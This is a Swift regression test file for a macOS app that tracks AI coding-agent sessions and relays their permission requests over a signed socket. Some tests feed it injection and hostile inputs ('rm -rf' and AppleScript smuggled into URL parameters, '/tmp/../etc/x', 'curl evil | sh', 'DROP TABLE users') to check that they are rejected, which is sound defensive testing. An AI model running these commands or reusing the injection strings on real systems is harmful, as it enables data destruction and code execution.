// Regression tests for the AI sessions: board order, persistence and liveness, URL cleaning, the focus plan, the request
// state machine and the approval protocol over a real Unix socket with this binary as the hook (`--agents-test`).

import AppKit

enum AgentTests {
    typealias Check = (_ name: String, _ ok: Bool) -> Void

    static func entry(_ id: String, _ state: String, _ since: Double, pid: Int32? = nil, start: Double? = nil) -> AgentEntry {
        AgentEntry(id: id, from: "Claude Code", project: id, state: state, since: since,
                   origin: pid.map { AgentOrigin(pid: $0, pidStart: start) })
    }

    static func tempDir() -> URL {
        let u = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("cocaine-agents-\(getpid())-\(UUID().uuidString.prefix(8))")
        try? FileManager.default.createDirectory(at: u, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o700])
        return u
    }

    /// For the render tools: seven sessions (more than fit), and optionally a request waiting for an answer.
    static func sample(approval: Bool) -> ([AgentEntry], [ApprovalRequest]) {
        let t = Date().timeIntervalSince1970
        let board = AgentBoard.order([
            entry("a", "working", t - 400), entry("b", "waiting", t - 90), entry("c", "done", t - 900), entry("d", "error", t - 30),
            entry("e", "working", t - 60), entry("f", "done", t - 1200), AgentEntry(id: "g", from: "Codex", project: "api", state: "working", since: t - 7000, restored: true)])
        guard approval else { return (board, []) }
        let input: [String: Any] = ["session_id": "q", "tool_name": "Bash", "tool_input": ["command": "git push --force-with-lease origin feature/notch"], "cwd": "/Users/x/canonical-com"]
        let r = ApprovalRequest.make(id: "SAMPLE-0001", nonce: String(repeating: "ab", count: 16), tool: "claude", input: input, origin: AgentOrigin(), now: Date())
        return (board, r.map { [$0] } ?? [])
    }

    /// The pure logic (also part of --selftest).
    static func pure(_ check: Check) {
        let now = Date(timeIntervalSince1970: 1_800_000_000)
        let t = now.timeIntervalSince1970
        let unknown: (AgentEntry) -> Bool? = { _ in nil }

        // Order and the full list.
        let b = AgentBoard(file: tempDir().appendingPathComponent("state.json"))
        b.set("d1", from: "Codex", project: nil, state: "done", now: now.addingTimeInterval(-100), alive: unknown)
        b.set("w1", from: "Codex", project: nil, state: "working", now: now.addingTimeInterval(-50), alive: unknown)
        b.set("q1", from: "Claude Code", project: nil, state: "waiting", now: now.addingTimeInterval(-300), alive: unknown)
        b.set("w2", from: "Codex", project: nil, state: "working", now: now.addingTimeInterval(-10), alive: unknown)
        b.set("e1", from: "Codex", project: nil, state: "error", now: now.addingTimeInterval(-20), alive: unknown)
        check("agents: needs-you first, then failed, working, done; newest first within", b.entries.map(\.id) == ["q1", "e1", "w2", "w1", "d1"])
        for i in 0..<12 { b.set("s\(i)", from: "Claude Code", project: nil, state: "working", now: now, alive: unknown) }
        check("agents: the board keeps every session, not three (\(b.entries.count))", b.entries.count == 17)
        b.set("q1", from: "Claude Code", project: nil, state: "waiting", now: now, alive: unknown)
        check("agents: a waiting session stays on top however many work", b.entries.first?.id == "q1")

        // Persistence and restore.
        check("agents: the board is written", b.write(cocaineOn: true, until: nil, now: now))
        let perms = (try? FileManager.default.attributesOfItem(atPath: b.file.path))?[.posixPermissions] as? Int
        check("agents: the saved board is private (0600)", perms == 0o600)
        let r = AgentBoard(file: b.file)
        r.restore(now: now, alive: unknown)
        check("agents: a restart restores every session (\(r.entries.count))", r.entries.count == b.entries.count && Set(r.entries.map(\.id)) == Set(b.entries.map(\.id)))
        check("agents: restored sessions are marked as such and keep their age", r.entries.allSatisfy { $0.restored == true }
              && r.entries.first { $0.id == "d1" }?.since == t - 100)
        r.set("w1", from: "Codex", project: nil, state: "working", now: now.addingTimeInterval(5), alive: unknown)
        check("agents: news from a restored session clears the mark and restarts its time",
              r.entries.first { $0.id == "w1" }.map { $0.restored == nil && $0.since == t + 5 } == true)
        let later = AgentBoard(file: b.file)
        later.restore(now: now.addingTimeInterval(1900), alive: unknown)
        check("agents: after a long restart finished ones are gone, recent working ones stay",
              !later.entries.contains { $0.id == "d1" || $0.id == "e1" } && later.entries.contains { $0.id == "w2" })

        // Liveness: a session whose process is gone doesn't stay "working" for hours (it kept the Mac awake by Smart Triggers).
        let l = AgentBoard(file: tempDir().appendingPathComponent("state.json"))
        let dead: (AgentEntry) -> Bool? = { $0.origin?.pid == 999 ? false : ($0.origin?.pid == 1000 ? true : nil) }
        l.set("gone", from: "Claude Code", project: nil, state: "working", origin: AgentOrigin(pid: 999, pidStart: 1), now: now, alive: { _ in nil })
        check("agents: a live-looking session is live while its process can't be checked", l.anyLive(now, alive: { _ in nil }))
        check("agents: …but not once its process is known to be gone", !l.anyLive(now, alive: dead))
        l.prune(now, alive: dead)
        check("agents: a working session whose process is gone is dropped", l.entries.isEmpty)
        l.set("long", from: "Claude Code", project: nil, state: "working", origin: AgentOrigin(pid: 1000, pidStart: 1), now: now, alive: dead)
        l.prune(now.addingTimeInterval(3 * 3600), alive: dead)
        check("agents: a working session whose process still runs outlives the 2-hour rule", l.entries.count == 1)
        l.prune(now.addingTimeInterval(25 * 3600), alive: dead)
        check("agents: …but not a day", l.entries.isEmpty)
        let me = AgentProcess.info(getpid())
        check("agents: this process is alive by pid and start time", AgentProcess.alive(pid: getpid(), start: me?.start) == true)
        check("agents: a reused pid (other start time) is not", AgentProcess.alive(pid: getpid(), start: (me?.start ?? 0) - 100) == false)
        check("agents: no pid, no verdict", AgentProcess.alive(pid: nil, start: nil) == nil)

        // Many sessions: capped, the oldest finished ones go first.
        let m = AgentBoard(file: tempDir().appendingPathComponent("state.json"))
        m.set("live", from: "x", project: nil, state: "waiting", now: now.addingTimeInterval(-600), alive: unknown)
        for i in 0..<150 { m.set("d\(i)", from: "x", project: nil, state: "done", now: now.addingTimeInterval(Double(i)), alive: unknown) }
        check("agents: at most \(AgentBoard.maxEntries) sessions are kept", m.entries.count == AgentBoard.maxEntries)
        check("agents: the cap drops old finished ones, not one that needs you", m.entries.first?.id == "live" && !m.entries.contains { $0.id == "d0" })

        // Damaged and older files.
        let bad = tempDir().appendingPathComponent("state.json")
        try? Data("{\"agents\": [".utf8).write(to: bad)
        let d = AgentBoard(file: bad); d.restore(now: now, alive: unknown)
        check("agents: a damaged saved board restores nothing (no crash)", d.entries.isEmpty)
        let old = tempDir().appendingPathComponent("state.json")
        try? Data(#"{"updated":1800000000,"cocaine":"ON","agents":[{"id":"a","from":"Codex","state":"working","since":1799999990},{"id":"a","from":"Codex","state":"done","since":1799999990}]}"#.utf8).write(to: old)
        let o = AgentBoard(file: old); o.restore(now: now, alive: unknown)
        check("agents: a board saved by an older Cocaine (no origin) restores, repeated ids once", o.entries.count == 1 && o.entries[0].state == "working")

        // URL parameters from untrusted local callers.
        let evil = URL(string: "cocaine://alert?from=Claude%20Code&event=input&session=abc%22%3B%20rm%20-rf&tty=ttys001%22%20%26%20do%20shell%20script%20%22x"
                       + "&app=com.apple.Terminal%22%29&tmux=%253%3Bkill&tmuxs=/tmp/../etc/x&cwd=relative/path&pid=-5&message=a%0Ab%E2%80%AEc&tsid=w0t0p0:ABCDEF12-3456")!
        let p = AlertParams.parse(evil)
        check("url: a tty that isn't /dev/ttysNNN is dropped (AppleScript injection)", p.origin.tty == nil)
        check("url: a malformed bundle id, tmux pane or socket path is dropped", p.origin.app == nil && p.origin.tmuxPane == nil && p.origin.tmuxSocket == nil)
        check("url: a relative folder and a bad pid are dropped", p.origin.cwd == nil && p.origin.pid == nil)
        check("url: the session id keeps only safe characters", p.session == "abcrm-rf")
        check("url: control and text-direction characters are removed from the message", p.message.map { !$0.contains("\n") && !$0.unicodeScalars.contains { $0.value == 0x202E } } == true)
        check("url: iTerm2's session id is the part after ':'", p.origin.termSession == "ABCDEF12-3456")
        let good = AlertParams.parse(URL(string: "cocaine://alert?from=Codex&event=done&tty=ttys004&app=com.googlecode.iterm2&tmux=%254&tmuxs=/private/tmp/tmux-501/default&cwd=/Users/x/My%20Project&pid=4242&wez=7&term=iTerm.app")!)
        check("url: a well-formed origin is kept whole", good.origin == AgentOrigin(app: "com.googlecode.iterm2", term: "iTerm.app", tty: "ttys004",
              tmuxPane: "%4", tmuxSocket: "/private/tmp/tmux-501/default", weztermPane: "7", cwd: "/Users/x/My Project", pid: 4242))
        check("url: without a session id, one per AI and folder", AlertParams.parse(URL(string: "cocaine://alert?from=Codex&project=app")!).sessionKey == "Codex|app")
        let long = AlertParams.parse(URL(string: "cocaine://alert?message=" + String(repeating: "x", count: 500))!)
        check("url: values are cut to size", long.message?.count == 200)

        // Duplicate events.
        var dd = AlertDeduper()
        check("url: the same event twice in a row counts once", !dd.isDuplicate("s|done", now: now) && dd.isDuplicate("s|done", now: now.addingTimeInterval(1)))
        check("url: …but again after a few seconds, and other sessions or events are separate", !dd.isDuplicate("s|done", now: now.addingTimeInterval(5))
              && !dd.isDuplicate("s|input", now: now.addingTimeInterval(5)) && !dd.isDuplicate("t|done", now: now.addingTimeInterval(5)))

        // The focus plan.
        typealias S = AgentFocus.Step
        check("focus: Terminal → its tab, then the app, then the folder",
              AgentFocus.plan(AgentOrigin(app: AgentFocus.terminal, tty: "ttys002", cwd: "/tmp")) == [S.terminalTab(tty: "ttys002"), .activate(app: AgentFocus.terminal), .revealFolder("/tmp")])
        check("focus: iTerm2 → its session (tty or id)", AgentFocus.plan(AgentOrigin(app: AgentFocus.iterm, termSession: "ABCDEF12-3456")).first == .itermSession(tty: nil, uuid: "ABCDEF12-3456"))
        check("focus: tmux → its pane first; the tty inside tmux is not the terminal's",
              AgentFocus.plan(AgentOrigin(app: AgentFocus.terminal, tty: "ttys009", tmuxPane: "%1")) == [S.tmux(socket: nil, pane: "%1"), .activate(app: AgentFocus.terminal)])
        check("focus: VS Code → the window with its folder, then the app",
              AgentFocus.plan(AgentOrigin(app: "com.microsoft.VSCode", tty: "ttys001", cwd: "/p")) == [S.openFolder(app: "com.microsoft.VSCode", path: "/p"), .activate(app: "com.microsoft.VSCode"), .revealFolder("/p")])
        check("focus: $TERM_PROGRAM stands in for a missing bundle id", AgentFocus.appID(AgentOrigin(term: "Apple_Terminal")) == AgentFocus.terminal)
        check("focus: an app or bundle sent as the folder is never opened (it would launch)",
              !AgentFocus.isPlainFolder("/System/Applications/Calculator.app") && !AgentFocus.isPlainFolder("/System/Library/PreferencePanes/Displays.prefPane")
              && !AgentFocus.isPlainFolder("/etc/hosts") && !AgentFocus.isPlainFolder("/no/such/folder"))
        check("focus: …a plain folder still is (symlinks resolved)", AgentFocus.isPlainFolder("/tmp") && AgentFocus.isPlainFolder(NSHomeDirectory()))
        check("focus: nothing known → nothing to try, and it says so",
              AgentFocus.plan(AgentOrigin()).isEmpty && AgentFocus.execute([], appID: nil) == AgentFocus.Result(level: .none, appName: nil, note: .noInfo))
        check("focus: the AppleScript only ever holds a checked tty", AgentFocus.terminalScript(tty: "ttys1\" & quit") == nil
              && AgentFocus.terminalScript(tty: "ttys003")?.contains("\"/dev/ttys003\"") == true && AgentFocus.itermScript(tty: "x\"", uuid: "y\"") == nil)

        // Requests: the state machine.
        let input: [String: Any] = ["session_id": "s-1", "hook_event_name": "PermissionRequest", "tool_name": "Bash",
                                    "tool_input": ["command": "git push\norigin main"], "cwd": "/Users/x/proj"]
        let nonce = String(repeating: "ab", count: 16)
        guard let req = ApprovalRequest.make(id: "REQ-00000001", nonce: nonce, tool: "claude", input: input, origin: AgentOrigin(), now: now) else {
            check("approvals: a Claude Code PermissionRequest is read", false); return
        }
        check("approvals: a Claude Code PermissionRequest is read (tool, command with its line break visible, project, session)", req.title == "Bash"
              && req.summary == "git push ⏎ origin main" && req.answerable && req.project == "proj" && req.session == "s-1" && req.choices.map(\.decision) == ["allow", "deny"])
        check("approvals: an unknown tool, event or a malformed id/nonce is refused",
              ApprovalRequest.make(id: "REQ-00000001", nonce: nonce, tool: "gemini", input: input, origin: AgentOrigin(), now: now) == nil
              && ApprovalRequest.make(id: "x", nonce: nonce, tool: "claude", input: input, origin: AgentOrigin(), now: now) == nil
              && ApprovalRequest.make(id: "REQ-00000001", nonce: "zz", tool: "claude", input: input, origin: AgentOrigin(), now: now) == nil
              && ApprovalRequest.make(id: "REQ-00000001", nonce: nonce, tool: "codex", input: ["hook_event_name": "Elicitation"], origin: AgentOrigin(), now: now) == nil)
        func perm(_ tool: String, _ args: [String: Any]) -> ApprovalRequest? {
            ApprovalRequest.make(id: "REQ-00000011", nonce: nonce, tool: "claude", input: ["tool_name": tool, "tool_input": args], origin: AgentOrigin(), now: now)
        }
        check("approvals: what isn't shown can't be allowed from the notch (Write's content, Edit's new text, MCP args behind a description)",
              perm("Write", ["file_path": "/Users/x/.zshrc", "content": "curl evil | sh"])?.answerable == false
              && perm("Edit", ["file_path": "/a", "old_string": "x", "new_string": "y"])?.answerable == false
              && perm("mcp__db__query", ["description": "list users", "sql": "DROP TABLE users"])?.answerable == false
              && perm("mcp__db__query", ["description": "list users", "sql": "DROP TABLE users"])?.choices.isEmpty == true)
        check("approvals: …nor a command too long to show whole",
              perm("Bash", ["command": "echo " + String(repeating: "a", count: 200) + "; curl evil | sh"])?.answerable == false)
        check("approvals: a short command with its label and timeout, or a Read with its range, still can",
              perm("Bash", ["command": "npm test", "description": "Run tests", "timeout": 60000])?.answerable == true
              && perm("Read", ["file_path": "/a/b", "offset": 1, "limit": 20])?.answerable == true
              && perm("WebSearch", ["query": "swift"])?.answerable == true)
        let ask = ApprovalRequest.make(id: "REQ-00000002", nonce: nonce, tool: "claude", input: ["tool_name": "AskUserQuestion", "tool_input": [:] as [String: Any]], origin: AgentOrigin(), now: now)
        check("approvals: a question (AskUserQuestion) has no documented hook answer: shown, not answerable", ask?.answerable == false && ask?.choices.isEmpty == true)
        let eli = ApprovalRequest.make(id: "REQ-00000003", nonce: nonce, tool: "claude", input: ["hook_event_name": "Elicitation", "mcp_server_name": "db",
            "message": "Which env?", "requested_schema": ["type": "object", "properties": ["env": ["type": "string", "enum": ["dev", "prod"]]]]], origin: AgentOrigin(), now: now)
        check("approvals: an MCP question with one choice field gets a button per value, and Decline",
              eli?.choices.map(\.label) == ["dev", "prod", "decline"] && eli?.choices.first?.content == #"{"env":"dev"}"#)
        let form = ApprovalRequest.make(id: "REQ-00000004", nonce: nonce, tool: "claude", input: ["hook_event_name": "Elicitation",
            "requested_schema": ["properties": ["a": ["type": "string"], "b": ["type": "string"]]]], origin: AgentOrigin(), now: now)
        check("approvals: a bigger MCP form can only be declined here", form?.choices.map(\.decision) == ["decline"])

        var st = ApprovalStore()
        check("approvals: a request is added once (a replayed id is refused)", st.add(req) && !st.add(req))
        check("approvals: an out-of-range choice changes nothing", st.answer(req.id, choice: 7, now: now) == .unknown && st.state(req.id) == .pending)
        check("approvals: the first click sends its decision", st.answer(req.id, choice: 0, now: now.addingTimeInterval(1)) == .send(decision: "allow", content: nil))
        check("approvals: a second click (or the other button) sends nothing", st.answer(req.id, choice: 1, now: now.addingTimeInterval(2)) == .alreadyAnswered
              && st.answer(req.id, choice: 0, now: now.addingTimeInterval(2)) == .alreadyAnswered)
        var r2 = req; r2.id = "REQ-00000005"
        _ = st.add(r2)
        check("approvals: a click after the deadline is refused as expired",
              st.answer(r2.id, choice: 0, now: r2.deadline.addingTimeInterval(1)) == .expired && st.answer(r2.id, choice: 0, now: r2.deadline.addingTimeInterval(2)) == .expired)
        var r3 = req; r3.id = "REQ-00000006"
        _ = st.add(r3)
        check("approvals: requests past their deadline expire once", st.expire(now: r3.deadline) == [r3.id] && st.expire(now: r3.deadline.addingTimeInterval(1)).isEmpty)
        var r4 = req; r4.id = "REQ-00000007"
        _ = st.add(r4)
        check("approvals: handed back to the terminal, then clicked: nothing sent", st.release(r4.id, now: now) && !st.release(r4.id, now: now)
              && st.answer(r4.id, choice: 0, now: now) == .alreadyAnswered)
        var r5 = req; r5.id = "REQ-00000008"
        _ = st.add(r5); st.gone(r5.id, now: now)
        check("approvals: the hook gone (timed out, interrupted): a click sends nothing", st.answer(r5.id, choice: 0, now: now) == .alreadyAnswered && st.pending.isEmpty)
        var r6 = req; r6.id = "REQ-00000009"; r6.answerable = false; r6.choices = []
        _ = st.add(r6)
        check("approvals: an unanswerable request can't be answered", st.answer(r6.id, choice: 0, now: now) == .unknown)
        var full = ApprovalStore()
        for i in 0..<ApprovalStore.maxPending { var x = req; x.id = "REQ-1\(String(format: "%07d", i))"; _ = full.add(x) }
        var extra = req; extra.id = "REQ-99999999"
        check("approvals: at most \(ApprovalStore.maxPending) wait at once", !full.add(extra))

        check("approvals: never held when off, or for a question", !ApprovalPolicy.hold(enabled: false, answerable: true, origin: AgentOrigin(), frontmost: nil, idleSeconds: 99)
              && !ApprovalPolicy.hold(enabled: true, answerable: false, origin: AgentOrigin(), frontmost: nil, idleSeconds: 99))
        check("approvals: not held while you're in that very terminal; held otherwise",
              !ApprovalPolicy.hold(enabled: true, answerable: true, origin: AgentOrigin(app: AgentFocus.terminal), frontmost: AgentFocus.terminal, idleSeconds: 2)
              && ApprovalPolicy.hold(enabled: true, answerable: true, origin: AgentOrigin(app: AgentFocus.terminal), frontmost: AgentFocus.terminal, idleSeconds: 60)
              && ApprovalPolicy.hold(enabled: true, answerable: true, origin: AgentOrigin(app: AgentFocus.terminal), frontmost: "com.apple.Safari", idleSeconds: 2))

        // The wire: only a signed answer for this request becomes a decision.
        let key = Data((0..<32).map { UInt8($0) }), other = Data((0..<32).map { UInt8(255 - $0) })
        let id = "REQ-00000001"
        func out(_ line: Data, k: Data = key, n: String = nonce, i: String = id, event: String = "PermissionRequest") -> String? {
            ApprovalWire.hookOutput(answer: line, key: k, id: i, nonce: n, event: event)
        }
        let allow = ApprovalWire.answer(key: key, id: id, nonce: nonce, decision: "allow", content: nil).dropLast()
        check("wire: a signed allow prints Claude Code's/Codex's documented decision",
              out(allow) == #"{"hookSpecificOutput":{"decision":{"behavior":"allow"},"hookEventName":"PermissionRequest"}}"#)
        check("wire: a signed deny prints a deny with a message", out(ApprovalWire.answer(key: key, id: id, nonce: nonce, decision: "deny", content: nil).dropLast())?
              .contains(#""behavior":"deny""#) == true)
        check("wire: signed with another key → no decision", out(ApprovalWire.answer(key: other, id: id, nonce: nonce, decision: "allow", content: nil).dropLast()) == nil)
        check("wire: an answer to another request (id or nonce) → no decision", out(allow, i: "REQ-00000002") == nil && out(allow, n: String(repeating: "cd", count: 16)) == nil)
        let forged = String(decoding: allow, as: UTF8.self).replacingOccurrences(of: "\"allow\"", with: "\"deny\"")
        check("wire: a decision changed after signing → no decision", out(Data(forged.utf8)) == nil)
        check("wire: \"none\" (hand back) and garbage → no decision", out(ApprovalWire.answer(key: key, id: id, nonce: nonce, decision: "none", content: nil).dropLast()) == nil
              && out(Data("garbage".utf8)) == nil && out(Data()) == nil)
        check("wire: a permission decision isn't valid for a question, nor the reverse",
              out(allow, event: "Elicitation") == nil && out(ApprovalWire.answer(key: key, id: id, nonce: nonce, decision: "accept", content: "{}").dropLast()) == nil)
        check("wire: an MCP answer prints action and content", out(ApprovalWire.answer(key: key, id: id, nonce: nonce, decision: "accept", content: #"{"env":"dev"}"#).dropLast(),
              event: "Elicitation") == #"{"hookSpecificOutput":{"action":"accept","content":{"env":"dev"},"hookEventName":"Elicitation"}}"#)
    }

    // MARK: protocol, with a real socket and this binary as the hook

    /// Runs `binary --agent-request <tool>` (or `sh -c command`) like a tool would: JSON on stdin, our test folder in the
    /// environment. Spins the main run loop meanwhile (the server's callbacks come on it). Returns stdout, status, seconds.
    static func runHook(_ args: [String], executable: String, input: String, support: URL, extraEnv: [String: String] = [:], limit: Double = 20)
        -> (out: String, status: Int32, seconds: Double) {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: executable)
        p.arguments = args
        var env = ProcessInfo.processInfo.environment
        env["COCAINE_SUPPORT"] = support.path
        extraEnv.forEach { env[$0.key] = $0.value }
        p.environment = env
        let inPipe = Pipe(), outPipe = Pipe()
        p.standardInput = inPipe; p.standardOutput = outPipe; p.standardError = FileHandle.nullDevice
        let start = Date()
        guard (try? p.run()) != nil else { return ("", -1, 0) }
        inPipe.fileHandleForWriting.write(Data(input.utf8))
        try? inPipe.fileHandleForWriting.close()
        var collected = Data()
        let reader = outPipe.fileHandleForReading
        reader.readabilityHandler = { h in let d = h.availableData; if !d.isEmpty { DispatchQueue.main.async { collected.append(d) } } }
        while p.isRunning && Date().timeIntervalSince(start) < limit { RunLoop.main.run(until: Date().addingTimeInterval(0.02)) }
        if p.isRunning { p.terminate() }
        p.waitUntilExit()
        reader.readabilityHandler = nil
        collected.append(reader.readDataToEndOfFile())
        RunLoop.main.run(until: Date().addingTimeInterval(0.05))
        return (String(decoding: collected, as: UTF8.self), p.terminationStatus, Date().timeIntervalSince(start))
    }

    static let sampleInput = #"{"session_id":"t-1","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"ls"},"cwd":"/tmp"}"#

    static func protocolTests(binary: String, _ check: Check) {
        let dir = tempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        let keyPath = AgentPaths.key(dir), sockPath = AgentPaths.socket(dir)
        let hook = ["--agent-request", "claude"]

        // No app: nothing printed, at once, exit 0.
        var r = runHook(hook, executable: binary, input: sampleInput, support: dir)
        check("protocol: app not running → no decision, exit 0, quick (\(String(format: "%.2f", r.seconds)) s)", r.out.isEmpty && r.status == 0 && r.seconds < 5)

        guard let key = ApprovalKey.loadOrCreate(keyPath) else { check("protocol: key created", false); return }
        let perms = (try? FileManager.default.attributesOfItem(atPath: keyPath))?[.posixPermissions] as? Int
        check("protocol: the key file is 0600 and stable", perms == 0o600 && ApprovalKey.loadOrCreate(keyPath) == key)

        let server = ApprovalServer(path: sockPath, key: key)
        var answer = "allow"
        var seen: [(String, [String: Any], AgentOrigin)] = []
        var gone: [String] = []
        server.onRequest = { id, _, tool, input, origin in
            seen.append((tool, input, origin))
            if answer != "silent" { server.reply(id, decision: answer, content: nil) }
        }
        server.onGone = { gone.append($0) }
        do { try server.start() } catch { check("protocol: the server starts (\(error))", false); return }
        defer { server.stop() }
        let sockPerms = (try? FileManager.default.attributesOfItem(atPath: sockPath))?[.posixPermissions] as? Int
        check("protocol: the socket is 0600", sockPerms == 0o600)
        let second = ApprovalServer(path: sockPath, key: key)
        check("protocol: a second app doesn't take over a live socket", { do { try second.start(); second.stop(); return false } catch { return true } }())

        r = runHook(hook, executable: binary, input: sampleInput, support: dir, extraEnv: ["TMUX_PANE": "%3", "__CFBundleIdentifier": "com.apple.Terminal"])
        check("protocol: Allow in the notch → the hook prints allow", r.out.contains(#""behavior":"allow""#) && r.status == 0)
        check("protocol: the app got the tool's input and where it runs", seen.last.map { $0.0 == "claude" && $0.1["tool_name"] as? String == "Bash"
            && $0.2.tmuxPane == "%3" && $0.2.app == "com.apple.Terminal" && $0.2.pid != nil } == true)
        answer = "deny"
        r = runHook(hook, executable: binary, input: sampleInput, support: dir)
        check("protocol: Deny → the hook prints deny", r.out.contains(#""behavior":"deny""#))
        answer = "none"
        r = runHook(hook, executable: binary, input: sampleInput, support: dir)
        check("protocol: handed back to the terminal → no decision", r.out.isEmpty && r.status == 0)
        answer = "allow"
        r = runHook(["--agent-request", "codex"], executable: binary, input: #"{"session_id":"c","tool_name":"shell","tool_input":{"command":"ls"},"cwd":"/tmp"}"#, support: dir)
        check("protocol: Codex's request (no hook_event_name) works the same", r.out.contains(#""behavior":"allow""#) && seen.last?.0 == "codex")
        r = runHook(["--agent-request", "gemini"], executable: binary, input: sampleInput, support: dir)
        check("protocol: a tool without a supported protocol never asks", r.out.isEmpty && seen.last?.0 != "gemini")

        // The hook gives up on time; the app sees it go.
        answer = "silent"
        let before = gone.count
        r = runHook(hook, executable: binary, input: sampleInput, support: dir, extraEnv: ["COCAINE_HOOK_TIMEOUT": "2"])
        RunLoop.main.run(until: Date().addingTimeInterval(0.3))
        check("protocol: no answer in time → no decision (\(String(format: "%.1f", r.seconds)) s)", r.out.isEmpty && r.status == 0 && r.seconds < 6)
        check("protocol: the app notices the hook has gone", gone.count == before + 1)
        answer = "allow"

        // A server that doesn't know the key can't answer.
        let fakeDir = tempDir()
        defer { try? FileManager.default.removeItem(at: fakeDir) }
        _ = ApprovalKey.loadOrCreate(AgentPaths.key(fakeDir))
        let fake = ApprovalServer(path: AgentPaths.socket(fakeDir), key: Data(repeating: 7, count: 32))
        fake.onRequest = { id, _, _, _, _ in fake.reply(id, decision: "allow", content: nil) }
        try? fake.start()
        r = runHook(hook, executable: binary, input: sampleInput, support: fakeDir)
        fake.stop()
        check("protocol: an answer not signed with the install's key is ignored", r.out.isEmpty)

        // Unsafe files: no decision.
        chmod(keyPath, 0o644)
        r = runHook(hook, executable: binary, input: sampleInput, support: dir)
        check("protocol: a key others can read → the hook trusts nothing", r.out.isEmpty)
        chmod(keyPath, 0o600)
        chmod(sockPath, 0o666)
        r = runHook(hook, executable: binary, input: sampleInput, support: dir)
        check("protocol: a socket others could open → the hook trusts nothing", r.out.isEmpty)
        chmod(sockPath, 0o600)
        r = runHook(hook, executable: binary, input: "not json", support: dir)
        check("protocol: input that isn't JSON → no decision", r.out.isEmpty && r.status == 0)

        // A replayed request id on a raw connection is refused.
        func raw(_ id: String) -> Int32 {
            let fd = ApprovalServer.connect(sockPath)
            let line = #"{"v":1,"id":"\#(id)","nonce":"\#(String(repeating: "ab", count: 16))","tool":"claude","input":{"tool_name":"Bash"}}"# + "\n"
            _ = Array(line.utf8).withUnsafeBytes { ApprovalServer.writeAll(fd, $0) }
            return fd
        }
        answer = "silent"
        let n0 = seen.count
        let a = raw("REPLAY-0001"), b = raw("REPLAY-0001")
        RunLoop.main.run(until: Date().addingTimeInterval(0.5))
        var pfd = pollfd(fd: b, events: Int16(POLLIN), revents: 0)
        var byte: UInt8 = 0
        let closedB = poll(&pfd, 1, 1000) == 1 && read(b, &byte, 1) == 0
        check("protocol: a second request with the same id is dropped", seen.count == n0 + 1 && closedB)
        close(a); close(b)
        RunLoop.main.run(until: Date().addingTimeInterval(0.3))
        check("protocol: after stop the socket file is gone", { server.stop(); return !FileManager.default.fileExists(atPath: sockPath) }())
    }
}
